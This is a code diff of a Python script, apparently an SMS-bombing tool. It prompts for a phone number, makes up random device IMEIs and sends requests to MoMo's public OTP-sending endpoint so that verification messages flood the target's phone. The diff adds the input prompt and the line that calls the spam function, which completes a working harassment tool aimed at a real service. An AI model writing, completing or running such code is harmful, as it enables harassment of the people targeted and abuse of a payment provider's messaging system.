@@ -1,3 +1,13 @@
+import json
+import urllib.request
+import urllib
+import uuid
+import requests
+import hmac
+import hashlib, random ,time
+from fastapi import FastAPI 
+from time import sleep
+sdtspam=input ('Enter Momo : ')
 def generateRandomString(length = 20) :
     characters = '0123456789abcdef'
     charactersLength = len(characters)
@@ -9,7 +19,7 @@ def generateRandomString(length = 20) :
     return randomString
 def generateImei() :
         return str(str(str(str(str(str(str(str(generateRandomString(8)) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(12));  
-def spam(sdt):
+def spam(sdt=sdtspam):
  time=random.randint(1000000000000,1999999999999)
  url="https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG"
  data={
@@ -65,3 +75,4 @@ def spam(sdt):
  data = json.dumps(data)
  json=requests.post(url,headers=h,data=data).text
  print(json)
+spam()
